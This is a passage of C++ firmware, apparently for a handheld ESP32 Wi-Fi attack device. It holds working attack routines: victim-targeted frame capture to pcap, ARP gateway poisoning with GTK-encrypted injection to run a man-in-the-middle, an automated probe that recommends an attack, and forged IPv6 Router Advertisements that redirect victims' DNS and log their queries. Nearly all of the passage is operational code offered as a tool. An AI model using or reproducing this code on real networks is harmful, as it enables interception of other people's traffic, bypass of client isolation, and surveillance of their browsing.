        isoMacStr(mac, b, sizeof(b));
        dm.setTextColor(0x6FE8); dm.printText("at "); dm.println(b);
    } else {
        dm.setTextColor(TFT_RED); dm.println("No ARP reply");
        dm.setTextColor(0x7BEF); dm.println("(strict isolation, or off-net)");
    }
    dm.println("");
    if (icmpOk) {
        snprintf(b, sizeof(b), "ICMP: reply %.0f ms", ms);
        dm.setTextColor(TFT_GREEN); dm.println(b);
    } else {
        dm.setTextColor(TFT_DARKGREY); dm.println("ICMP: no reply (firewall - ok)");
    }
    dm.printCommandScreen();
}

// ── portdown — targeted victim capture → SD pcap (non-disruptive) ────────────────
// Promiscuous-captures every 802.11 data frame mentioning the victim MAC and logs
// it to /apps/isoscan/NNN.pcap (Wireshark/aircrack compatible). Does NOT change our
// MAC and does NOT drop our connection. On an isolated net it sees the group frames
// involving the victim (+ anything a gateway-poison run redirects our way); on an
// L2 AP with a poison active it captures the redirected downlink. GDMA-safe: frames
// ring in RAM, flushed to SD with promiscuous paused.
static void isoPortDown(int idx) {
    auto& dm = displayManager;
    isoHeader("victim capture");
    uint8_t vic[6];
    if (!netspyDeviceMac(idx, vic)) { dm.setTextColor(TFT_RED); dm.println("Bad victim."); dm.printCommandScreen(); return; }
    if (!sdCardManager.isReady()) {
        dm.setTextColor(TFT_RED); dm.println("No SD — capture needs it.");
        dm.printCommandScreen(); return;
    }

    // Allocate the pcap file (promiscuous still off → plain SD I/O).
    char path[40]; uint16_t seq = 1;
    sdCardManager.ensureDir(SD_DIR_ISOSCAN);
    while (seq <= 999) {
        snprintf(path, sizeof(path), SD_DIR_ISOSCAN "/%03u.pcap", seq);
        if (!SD.exists(path)) break;
        seq++;
    }
    File cap = SD.open(path, FILE_WRITE);
    if (!cap) { dm.setTextColor(TFT_RED); dm.println("SD open failed."); dm.printCommandScreen(); return; }
    pcap::writeGlobalHeader(cap);

    char b[56];
    isoMacStr(vic, b, sizeof(b));
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2); dm.printText("victim");
    dm.setTextColor(TFT_CYAN);     dm.setCursor(56, outputY + LINE_HEIGHT * 2); dm.printText(b);
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 3); dm.printText("file");
    dm.setTextColor(0x6FE8);       dm.setCursor(56, outputY + LINE_HEIGHT * 3); dm.printText(path);

    // Arm capture (portdown does not do redirect classification).
    s_capHead = s_capTail = 0; s_capSeen = s_capDropped = 0;
    memcpy((void*)s_capVic, vic, 6); s_capActive = true; s_capRedirOn = false;
    wifi_promiscuous_filter_t flt = {}; flt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&flt);
    esp_wifi_set_promiscuous_rx_cb(isoCapCb);
    esp_wifi_set_promiscuous(true);

    uint32_t written = 0, lastDraw = 0, lastFlush = 0;
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[q] stop + save");
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;

        // Flush drained frames to SD with promiscuous paused (GDMA rule).
        uint8_t fill = (uint8_t)((s_capHead - s_capTail) & (ISO_CAP_RING - 1));
        if (fill && (millis() - lastFlush >= 1500 || fill > ISO_CAP_RING / 2)) {
            lastFlush = millis();
            ScopedPromiscPause _;
            while (s_capTail != s_capHead) {
                IsoCapFrame fr;
                memcpy(&fr, (const void*)&s_capRing[s_capTail], sizeof(fr));
                s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
                pcap::writeRecord(cap, fr.data, fr.len, fr.ts);
                written++;
            }
            cap.flush();
        }

        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
        if (!dm.isBlocked() && millis() - lastDraw >= 500) {
            snprintf(b, sizeof(b), "seen %lu  saved %lu  drop %lu",
                     (unsigned long)s_capSeen, (unsigned long)written, (unsigned long)s_capDropped);
            dm.fillRect(0, outputY + LINE_HEIGHT * 6, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
            dm.setTextColor(s_capSeen ? TFT_GREEN : TFT_DARKGREY);
            dm.setCursor(6, outputY + LINE_HEIGHT * 6); dm.printText(b);
            lastDraw = millis();
        }
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    // Stop capture, final drain, close (promiscuous off → plain SD).
    s_capActive = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    while (s_capTail != s_capHead) {
        IsoCapFrame fr;
        memcpy(&fr, (const void*)&s_capRing[s_capTail], sizeof(fr));
        s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
        pcap::writeRecord(cap, fr.data, fr.len, fr.ts);
        written++;
    }
    cap.close();
    dm.clearScreen(); dm.printCommandScreen();
}

// ── combined MITM — gateway poison (TX) + victim capture (RX) at once ─────────────
// The real MITM: hold a gateway ARP-poison so the victim sends its uplink to us,
// AND run promiscuous capture at the same time to (a) log the redirected traffic to
// SD and (b) COUNT the redirected frames — a nonzero count is live proof the poison
// took hold and this network does L2 delivery (a mobile hotspot L3-routes past the
// poison → count stays 0). Turns the two independent pieces into one automatic MITM.
static void isoMitm(int idx) {
    auto& dm = displayManager;
    isoHeader("combined MITM");
    uint8_t gtk[32]; int glen = 0;
    if (!netspyGetGtk(gtk, &glen) || glen != 16) {
        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return;
    }
    const uint8_t* bm = WiFi.BSSID();
    if (!bm) { dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return; }
    uint8_t bssid[6]; memcpy(bssid, bm, 6);
    uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
    uint8_t vic[6];
    if (!netspyDeviceMac(idx, vic)) { dm.setTextColor(TFT_RED); dm.println("Bad victim."); dm.printCommandScreen(); return; }
    IPAddress gw = WiFi.gatewayIP();
    uint32_t gwIp = ((uint32_t)gw[0] << 24) | ((uint32_t)gw[1] << 16) | ((uint32_t)gw[2] << 8) | gw[3];
    uint32_t victimIp = netspyDeviceIp(idx);
    if (!gwIp) { dm.setTextColor(TFT_RED); dm.println("No gateway IP."); dm.printCommandScreen(); return; }

    // Optional pcap of the redirected traffic (SD I/O still off-radio here).
    File cap; char path[40] = "";
    if (sdCardManager.isReady()) {
        sdCardManager.ensureDir(SD_DIR_ISOSCAN);
        uint16_t s = 1;
        while (s <= 999) { snprintf(path, sizeof(path), SD_DIR_ISOSCAN "/%03u.pcap", s); if (!SD.exists(path)) break; s++; }
        cap = SD.open(path, FILE_WRITE);
        if (cap) pcap::writeGlobalHeader(cap);
    }

    char b[56];
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2); dm.printText("file");
    dm.setTextColor(0x6FE8);       dm.setCursor(56, outputY + LINE_HEIGHT * 2);
    dm.printText(cap ? path : "(no SD - live count only)");

    // Arm capture with redirect detection.
    s_capHead = s_capTail = 0; s_capSeen = s_capDropped = s_capRedir = s_capArpAck = s_capCand = 0;
    memcpy((void*)s_capVic, vic, 6); memcpy((void*)s_capOur, src, 6);
    s_capActive = true; s_capRedirOn = true;
    wifi_promiscuous_filter_t flt = {}; flt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&flt);
    esp_wifi_set_promiscuous_rx_cb(isoCapCb);
    esp_wifi_set_promiscuous(true);

    uint64_t pn = 0x800000000000ULL; uint8_t keyid = 1; uint16_t seq = 0;
    uint32_t txOk = 0, txErr = 0, written = 0;
    uint32_t lastTx = 0, lastDraw = 0, lastFlush = 0;
    // Rate-gate the "MITM LIVE" verdict: a few stray redirected frames (residue from
    // an old ARP entry) is NOT a held MITM — only a SUSTAINED data rate is. Sample the
    // redirect count over a 2s window; declare LIVE only above a real throughput.
    uint32_t winRedir0 = 0, winMs = millis(), rate = 0; bool sustained = false;
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[k] keyid 1/2   [q] stop + save");
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; lastDraw = 0; }

        // Every 2s, measure real redirect throughput (frames/sec) for the verdict.
        if (millis() - winMs >= 2000) {
            uint32_t d = s_capRedir - winRedir0;
            rate = d / 2;                                 // frames per second
            sustained = (rate >= 8);                      // ~8+/s = genuinely holding
            winRedir0 = s_capRedir; winMs = millis();
        }

        // Hold the poison (~30 ms ≈ 33 fps, plenty to keep the ARP entry warm).
        if (millis() - lastTx >= 30) {
            lastTx = millis();
            esp_err_t rc = isoTxGtkArp(gtk, bssid, src, keyid, pn, seq++, gwIp, victimIp);
            if (rc == ESP_OK) txOk++; else txErr++;
            pn++;
        }

        // Flush captured frames to SD with promiscuous paused (GDMA rule).
        uint8_t fill = (uint8_t)((s_capHead - s_capTail) & (ISO_CAP_RING - 1));
        if (cap && fill && (millis() - lastFlush >= 1500 || fill > ISO_CAP_RING / 2)) {
            lastFlush = millis();
            ScopedPromiscPause _;
            while (s_capTail != s_capHead) {
                IsoCapFrame fr;
                memcpy(&fr, (const void*)&s_capRing[s_capTail], sizeof(fr));
                s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
                pcap::writeRecord(cap, fr.data, fr.len, fr.ts);
                written++;
            }
            cap.flush();
        } else if (!cap) {
            // No SD → just drain the ring so it doesn't back up (count still works).
            while (s_capTail != s_capHead) s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
        }

        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
        if (!dm.isBlocked() && millis() - lastDraw >= 400) {
            int y = outputY + LINE_HEIGHT * 3;
            snprintf(b, sizeof(b), "poison TX: %lu (keyid %u)", (unsigned long)txOk, keyid);
            dm.fillRect(0, y, SCREEN_WIDTH, LINE_HEIGHT * 6, TFT_BLACK);
            dm.setTextColor(txErr ? TFT_RED : TFT_GREEN); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
            snprintf(b, sizeof(b), "victim frames: %lu  saved %lu", (unsigned long)s_capSeen, (unsigned long)written);
            dm.setTextColor(s_capSeen ? TFT_WHITE : TFT_DARKGREY); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
            // ARP reply = victim reacted to the poison (NOT proof of interception).
            snprintf(b, sizeof(b), "poison ACK (ARP): %lu", (unsigned long)s_capArpAck);
            dm.setTextColor(s_capArpAck ? TFT_YELLOW : TFT_DARKGREY); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT + 4;
            // The ONLY real headline: SUSTAINED victim IP DATA = MITM actually holding.
            if (sustained) {
                snprintf(b, sizeof(b), "MITM LIVE - %lu/s (%lu total)", (unsigned long)rate, (unsigned long)s_capRedir);
                dm.setTextColor(TFT_GREEN); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
                dm.setTextColor(0x6FE8); dm.setCursor(6, y); dm.printText("victim uplink is flowing to us.");
            } else if (s_capRedir) {
                snprintf(b, sizeof(b), "leak %lu - NOT held", (unsigned long)s_capRedir);
                dm.setTextColor(TFT_YELLOW); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
                dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("(stray frames, real gw wins)");
            } else if (s_capArpAck) {
                dm.setTextColor(TFT_YELLOW); dm.setCursor(6, y); dm.printText("poison seen, no data redirect"); y += LINE_HEIGHT;
                dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("(victim ignores it / real gw wins)");
            } else if (s_capCand) {
                // frames matched on address but classified as neither ARP nor IP →
                // the relayed unicast-to-us payload isn't decrypted in promiscuous.
                snprintf(b, sizeof(b), "%lu frames, payload unreadable", (unsigned long)s_capCand);
                dm.setTextColor(TFT_ORANGE); dm.setCursor(6, y); dm.printText(b);
            } else {
                dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("no redirect yet...");
            }
            lastDraw = millis();
        }
        vTaskDelay(pdMS_TO_TICKS(5));
    }

    // Stop, final drain, close (promiscuous off → plain SD).
    s_capActive = false; s_capRedirOn = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    if (cap) {
        while (s_capTail != s_capHead) {
            IsoCapFrame fr;
            memcpy(&fr, (const void*)&s_capRing[s_capTail], sizeof(fr));
            s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
            pcap::writeRecord(cap, fr.data, fr.len, fr.ts);
        }
        cap.close();
    }
    dm.clearScreen(); dm.printCommandScreen();
}

// ── auto — smart probe → detect → recommend ──────────────────────────────────────
// Runs a short, mostly non-destructive probe sequence and prints a verdict + a
// recommended attack, so the operator doesn't have to hand-run each piece and infer
// L2-vs-L3 by eye (which is exactly what we did by hand during bring-up). Stages:
//   1 CCMP self-test        — is the inject crypto path healthy?
//   2 GTK read              — do we have the group key to inject with?
//   3 normal ARP resolve    — can the stack reach the victim WITHOUT us injecting?
//                             (fails under isolation → a later inject hit = bypass)
//   4 GTK inject (~6s)      — inject broadcast ARP, watch our ARP cache for a reply
//   5 poison-hold (~6s)     — brief gateway poison + redirect count = L2-vs-L3 test
//   6 bounce ping           — IP-layer reachability via the gateway
static void isoSmartAuto(int idx) {
    auto& dm = displayManager;
    isoHeader("smart auto");
    uint32_t victimIp = netspyDeviceIp(idx);
    uint8_t  vic[6];  bool haveMac = netspyDeviceMac(idx, vic);
    const char* nm = netspyDeviceName(idx); if (!nm) nm = "?";

    int line = outputY + LINE_HEIGHT * 2;
    auto say = [&](const char* label, const char* val, uint16_t col) {
        if (dm.isBlocked()) return;
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, line);  dm.printText(label);
        dm.setTextColor(col);          dm.setCursor(150, line); dm.printText(val);
        line += LINE_HEIGHT;
    };
    { char b[40]; snprintf(b, sizeof(b), "%.14s", nm);
      dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, line); dm.printText("target");
      dm.setTextColor(TFT_CYAN); dm.setCursor(72, line); dm.printText(b); line += LINE_HEIGHT + 4; }

    // 1 — CCMP crypto path.
    bool ccmpOk = isoCcmpSelfTest();
    say("1 CCMP self-test", ccmpOk ? "PASS" : "FAIL", ccmpOk ? TFT_GREEN : TFT_RED);

    // 2 — GTK availability.
    uint8_t gtk[32]; int glen = 0;
    bool gtkOk = netspyGetGtk(gtk, &glen) && glen == 16;
    say("2 GTK key", gtkOk ? "16B ready" : "unreadable", gtkOk ? TFT_GREEN : TFT_RED);

    const uint8_t* bm = WiFi.BSSID();
    uint8_t bssid[6]; if (bm) memcpy(bssid, bm, 6);
    uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
    IPAddress lip = WiFi.localIP();
    uint32_t myIp = ((uint32_t)lip[0] << 24) | ((uint32_t)lip[1] << 16) | ((uint32_t)lip[2] << 8) | lip[3];

    // helper: is the victim currently in our ARP cache (resolved)?
    auto arpResolved = [&](uint8_t out[6]) -> bool {
        if (!netif_default || !victimIp) return false;
        ip4_addr_t vt; IP4_ADDR(&vt, (victimIp >> 24) & 0xff, (victimIp >> 16) & 0xff,
                                (victimIp >> 8) & 0xff, victimIp & 0xff);
        struct eth_addr* er = nullptr; const ip4_addr_t* ir = nullptr;
        LOCK_TCPIP_CORE();
        etharp_request(netif_default, &vt);
        s8_t hit = etharp_find_addr(netif_default, &vt, &er, &ir);
        UNLOCK_TCPIP_CORE();
        if (hit >= 0 && er) { if (out) memcpy(out, er->addr, 6); return true; }
        return false;
    };

    // 3 — can the normal stack reach the victim without us injecting? Poll ~2s.
    bool normalArp = false;
    for (int t = 0; t < 8 && !normalArp; t++) { normalArp = arpResolved(nullptr); vTaskDelay(pdMS_TO_TICKS(250)); }
    say("3 normal ARP", normalArp ? "resolves (soft/none)" : "blocked (isolated)",
        normalArp ? TFT_YELLOW : TFT_CYAN);

    // 4 — GTK inject reachability (~6s): does an injected broadcast ARP get a reply?
    bool injectReach = false;
    if (gtkOk && bm && victimIp) {
        uint64_t pn = 0x800000000000ULL; uint16_t seq = 0; uint32_t t0 = millis(), lastTx = 0;
        while (millis() - t0 < 6000 && !injectReach) {
            if (inputHandler.getKeyboardInput() == 'q') break;
            if (millis() - lastTx >= 20) { lastTx = millis(); isoTxGtkArp(gtk, bssid, src, 1, pn++, seq++, myIp, victimIp); }
            injectReach = arpResolved(nullptr);
            vTaskDelay(pdMS_TO_TICKS(20));
        }
    }
    say("4 GTK inject reach", !gtkOk ? "skipped (no GTK)" : (injectReach ? "REPLY - reachable" : "no reply"),
        injectReach ? TFT_GREEN : TFT_DARKGREY);

    // 5 — poison-hold L2/L3 test (~6s): count redirected victim uplink.
    uint32_t redir = 0, arpAck = 0, cand = 0;
    if (gtkOk && bm && haveMac) {
        IPAddress gw = WiFi.gatewayIP();
        uint32_t gwIp = ((uint32_t)gw[0] << 24) | ((uint32_t)gw[1] << 16) | ((uint32_t)gw[2] << 8) | gw[3];
        if (gwIp) {
            s_capHead = s_capTail = 0; s_capSeen = s_capRedir = s_capArpAck = s_capCand = s_capDropped = 0;
            memcpy((void*)s_capVic, vic, 6); memcpy((void*)s_capOur, src, 6);
            s_capActive = true; s_capRedirOn = true;
            wifi_promiscuous_filter_t flt = {}; flt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
            esp_wifi_set_promiscuous_filter(&flt);
            esp_wifi_set_promiscuous_rx_cb(isoCapCb);
            esp_wifi_set_promiscuous(true);
            uint64_t pn = 0x800000000000ULL; uint16_t seq = 0; uint32_t t0 = millis(), lastTx = 0;
            while (millis() - t0 < 6000) {
                if (inputHandler.getKeyboardInput() == 'q') break;
                if (millis() - lastTx >= 30) { lastTx = millis(); isoTxGtkArp(gtk, bssid, src, 1, pn++, seq++, gwIp, victimIp); }
                // drain ring (no SD in the probe — count only)
                while (s_capTail != s_capHead) s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
                vTaskDelay(pdMS_TO_TICKS(5));
            }
            redir = s_capRedir;
            arpAck = s_capArpAck;
            cand  = s_capCand;
            s_capActive = false; s_capRedirOn = false;
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(NULL);
        }
    }
    // redir = real IP data relayed to us (true MITM). arpAck = victim merely replied
    // to our poison (reacted, not intercepted) — reported so a green ARP-only result
    // isn't mistaken for interception.
    { char b[40];
      // >=16 redirected in the ~6s window = real throughput (not stray residue).
      bool viable = (redir >= 16);
      if (!(gtkOk && haveMac))      snprintf(b, sizeof(b), "skipped");
      else if (viable)              snprintf(b, sizeof(b), "%lu data - MITM viable", (unsigned long)redir);
      else if (redir)               snprintf(b, sizeof(b), "leak %lu - not held", (unsigned long)redir);
      else if (arpAck)              snprintf(b, sizeof(b), "%lu ACK only, no data", (unsigned long)arpAck);
      else if (cand)                snprintf(b, sizeof(b), "%lu frames, unreadable", (unsigned long)cand);
      else                          snprintf(b, sizeof(b), "no reaction");
      say("5 poison L2 test", b, viable ? TFT_GREEN : ((redir || arpAck || cand) ? TFT_YELLOW : TFT_DARKGREY)); }

    // 6 — IP-layer bounce.
    bool bounceOk = false;
    if (victimIp) {
        IPAddress vAddr((uint8_t)((victimIp >> 24) & 0xff), (uint8_t)((victimIp >> 16) & 0xff),
                        (uint8_t)((victimIp >> 8) & 0xff), (uint8_t)(victimIp & 0xff));
        bounceOk = Ping.ping(vAddr, 2);
    }
    // ICMP-only datapoint. A "no reply" here is expected on Windows (firewall drops
    // echo) and does NOT mean unreachable — stage 3's ARP resolve is the real check.
    say("6 ICMP ping", bounceOk ? "reply" : "no reply (fw ok)", bounceOk ? TFT_GREEN : TFT_DARKGREY);

    // ── verdict + recommendation ──────────────────────────────────────────────────
    line += 4;
    const char* verdict; uint16_t vcol;
    if (!ccmpOk || !gtkOk)      { verdict = "inject unavailable -> bounce/portdown"; vcol = TFT_RED; }
    else if (redir >= 16)      { verdict = "L2 MITM VIABLE -> run 'mitm'";          vcol = TFT_GREEN; }
    else if (redir || arpAck)  { verdict = "poison seen, not holding -> portdown";  vcol = TFT_YELLOW; }
    else if (injectReach)      { verdict = "1-way inject OK, no intercept -> 'dns'"; vcol = TFT_YELLOW; }
    else if (bounceOk)         { verdict = "IP-reachable -> 'portdown' capture";     vcol = TFT_YELLOW; }
    else                       { verdict = "victim unreachable -> retry / re-scan";  vcol = TFT_RED; }
    if (!dm.isBlocked()) {
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, line); dm.printText("VERDICT"); line += LINE_HEIGHT;
        dm.setTextColor(vcol);         dm.setCursor(6, line); dm.printText(verdict);
    }
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("any key to continue");
    while (true) { char k = inputHandler.getKeyboardInput(); if (k) break;
                   if (LockScreenManager::getInstance().consumeJustUnlocked()) break; vTaskDelay(pdMS_TO_TICKS(30)); }
    dm.clearScreen(); dm.printCommandScreen();
}

// ── RA DNS poison — ICMPv6 Router Advertisement pointing the victim's DNS at us ──
// Injects a GTK-encrypted multicast (ff02::1) RA carrying an RDNSS option = our
// link-local IPv6. A victim that honors it uses us as its DNS server; a UDP-53
// listener logs the queries to SD. Needs IPv6 (enabled here) and, like all
// interception, a network that lets the victim's query reach us (an L2 AP; a phone
// hotspot's isolation blocks the return path). HW-gated — build/verify at the lab.

// Internet checksum over the ICMPv6 pseudo-header + message (cksum field = 0).
static uint16_t isoIcmp6Cksum(const uint8_t* s16, const uint8_t* d16, const uint8_t* m, int mlen) {
    uint32_t sum = 0;
    for (int i = 0; i < 16; i += 2) sum += (uint16_t)((s16[i] << 8) | s16[i + 1]);
    for (int i = 0; i < 16; i += 2) sum += (uint16_t)((d16[i] << 8) | d16[i + 1]);
    sum += (uint32_t)mlen;                           // upper-layer length
    sum += 58;                                       // next header = ICMPv6
    for (int i = 0; i < mlen; i += 2)
        sum += (uint16_t)((m[i] << 8) | (i + 1 < mlen ? m[i + 1] : 0));
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)~sum;
}

// LLC/SNAP + IPv6 + ICMPv6 RA(RDNSS = ll) into p. Returns length (88).
static int isoBuildRA(const uint8_t ll[16], uint8_t* p) {
    static const uint8_t snap[8]     = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x86, 0xDD };
    static const uint8_t allNodes[16]= { 0xFF, 0x02, 0,0,0,0,0,0,0,0,0,0,0,0,0, 0x01 };
    memcpy(p, snap, 8);
    uint8_t* ip6 = p + 8;

    uint8_t icmp[40];
    memset(icmp, 0, sizeof(icmp));
    icmp[0] = 134;                                   // Router Advertisement
    icmp[4] = 64;                                    // cur hop limit
    // router lifetime 0 (DNS-only, not a default route); reachable/retrans = 0
    icmp[16] = 25;                                   // RDNSS option
    icmp[17] = 3;                                    // length in 8-byte units (8 + 16)
    icmp[20] = icmp[21] = icmp[22] = icmp[23] = 0xFF; // RDNSS lifetime = ~infinite
    memcpy(icmp + 24, ll, 16);                       // DNS server = our link-local

    memset(ip6, 0, 40);
    ip6[0] = 0x60;                                   // version 6
    ip6[4] = 0; ip6[5] = 40;                         // payload length = ICMPv6 len
    ip6[6] = 58;                                     // next header = ICMPv6
    ip6[7] = 255;                                    // hop limit (required for RA)
    memcpy(ip6 + 8,  ll, 16);                        // src = our link-local
    memcpy(ip6 + 24, allNodes, 16);                  // dst = ff02::1

    uint16_t ck = isoIcmp6Cksum(ip6 + 8, ip6 + 24, icmp, 40);
    icmp[2] = (uint8_t)(ck >> 8); icmp[3] = (uint8_t)(ck & 0xff);
    memcpy(ip6 + 40, icmp, 40);
    return 8 + 40 + 40;
}

// Parse the first QNAME out of a DNS query payload (header 12B + labels).
static bool isoDnsName(const uint8_t* b, int len, char* out, int outsz) {
    if (len < 13) return false;
    int o = 12, on = 0;
    while (o < len) {
        uint8_t l = b[o++];
        if (l == 0) break;
        if (l & 0xC0) return false;                  // no compression in a query
        if (o + l > len) return false;
        for (int i = 0; i < l; i++)
            if (on < outsz - 1) { char c = b[o + i]; out[on++] = (c >= 32 && c < 127) ? c : '?'; }
        if (on < outsz - 1) out[on++] = '.';
        o += l;
    }
    if (on > 0 && out[on - 1] == '.') on--;
    out[on] = '\0';
    return on > 0;
}

static void isoRaDns(int idx) {
    auto& dm = displayManager;
    (void)idx;                                       // RA is multicast — hits all clients
    isoHeader("RA DNS poison");
    uint8_t gtk[32]; int glen = 0;
    if (!netspyGetGtk(gtk, &glen) || glen != 16) {
        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return;
    }
    const uint8_t* bm = WiFi.BSSID();
    if (!bm) { dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return; }
    uint8_t bssid[6]; memcpy(bssid, bm, 6);
    uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);

    dm.setTextColor(0x7BEF); dm.println("Bringing up IPv6 link-local...");
    WiFi.enableIpV6();
    esp_netif_t* nif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    uint8_t ll[16]; bool haveLL = false;
    if (nif) {
        esp_netif_create_ip6_linklocal(nif);
        for (int t = 0; t < 30 && !haveLL; t++) {
            esp_ip6_addr_t a;
            if (esp_netif_get_ip6_linklocal(nif, &a) == ESP_OK) { memcpy(ll, a.addr, 16); haveLL = true; break; }
            char k = inputHandler.getKeyboardInput();
            if (k == 'q' || k == 'Q') { dm.printCommandScreen(); return; }
            vTaskDelay(pdMS_TO_TICKS(200));
        }
    }
    if (!haveLL) { dm.setTextColor(TFT_RED); dm.println("No IPv6 link-local."); dm.printCommandScreen(); return; }

    // DNS query log (STA mode — plain SD I/O, no promiscuous here).
    File log; char path[40] = "";
    if (sdCardManager.isReady()) {
        sdCardManager.ensureDir(SD_DIR_ISOSCAN);
        uint16_t seq = 1;
        while (seq <= 999) { snprintf(path, sizeof(path), SD_DIR_ISOSCAN "/dns_%03u.csv", seq); if (!SD.exists(path)) break; seq++; }
        log = SD.open(path, FILE_WRITE);
        if (log) log.println("time_ms,src_ip,query");
    }
    WiFiUDP udp; udp.begin(53);

    uint64_t pn = 0x800000000000ULL; uint8_t keyid = 1; uint16_t seq = 0;
    uint32_t raSent = 0, dnsRx = 0, lastRA = 0, lastDraw = 0;
    char lastQ[40] = "";
    char llShort[24]; snprintf(llShort, sizeof(llShort), "fe80::..%02x%02x", ll[14], ll[15]);

    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; lastDraw = 0; }

        if (millis() - lastRA >= 2000) {             // RAs are periodic — 2s is plenty
            lastRA = millis();
            uint8_t pnb[6]; for (int i = 0; i < 6; i++) pnb[i] = (uint8_t)((pn >> (8 * i)) & 0xff);
            uint8_t hdr[24]; isoBuildHdr(bssid, src, seq++, hdr);
            static const uint8_t m6[6] = { 0x33, 0x33, 0x00, 0x00, 0x00, 0x01 };
            memcpy(hdr + 4, m6, 6);                   // A1 = IPv6 all-nodes multicast
            uint8_t plain[128]; int plen = isoBuildRA(ll, plain);
            uint8_t enc[160];
            int elen = isoCcmpEncrypt(gtk, 16, hdr, keyid, pnb, plain, plen, enc, sizeof(enc));
            if (elen > 0) {
                uint8_t frame[192]; memcpy(frame, hdr, 24); memcpy(frame + 24, enc, elen);
                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 24 + elen, false) == ESP_OK) raSent++;
                pn++;
            }
            lastDraw = 0;
        }

        int n = udp.parsePacket();
        if (n > 0) {
            uint8_t buf[256]; int r = udp.read(buf, sizeof(buf));
            char dom[40];
            if (r > 0 && isoDnsName(buf, r, dom, sizeof(dom))) {
                dnsRx++; strncpy(lastQ, dom, sizeof(lastQ) - 1); lastQ[sizeof(lastQ) - 1] = '\0';
                if (log) {
                    IPAddress ri = udp.remoteIP();
                    char line[80]; snprintf(line, sizeof(line), "%lu,%u.%u.%u.%u,%s",
                        (unsigned long)millis(), ri[0], ri[1], ri[2], ri[3], dom);
                    log.println(line); log.flush();
                }
                lastDraw = 0;
            }
        }

        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
        if (!dm.isBlocked() && millis() - lastDraw >= 400) {
            char b[56]; int y = outputY + LINE_HEIGHT * 2;
            dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("our DNS");
            dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, y); dm.printText(llShort); y += LINE_HEIGHT + 4;
            snprintf(b, sizeof(b), "RA sent : %lu (keyid %u)", (unsigned long)raSent, keyid);
            dm.setTextColor(TFT_GREEN);    dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
            snprintf(b, sizeof(b), "DNS rcvd: %lu", (unsigned long)dnsRx);
            dm.setTextColor(dnsRx ? TFT_GREEN : TFT_DARKGREY); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT + 4;
            if (lastQ[0]) {
                dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("last:");
                dm.setTextColor(TFT_CYAN);     dm.setCursor(48, y); dm.printText(lastQ);
            }
            dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[k] keyid   [q] stop");
            lastDraw = millis();
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    udp.stop();
    if (log) log.close();
    dm.clearScreen(); dm.printCommandScreen();
}

// ── attack dispatch ──────────────────────────────────────────────────────────────
static void isoRunAttack(int idx, IsoAttack attack) {
    auto& dm = displayManager;
    switch (attack) {
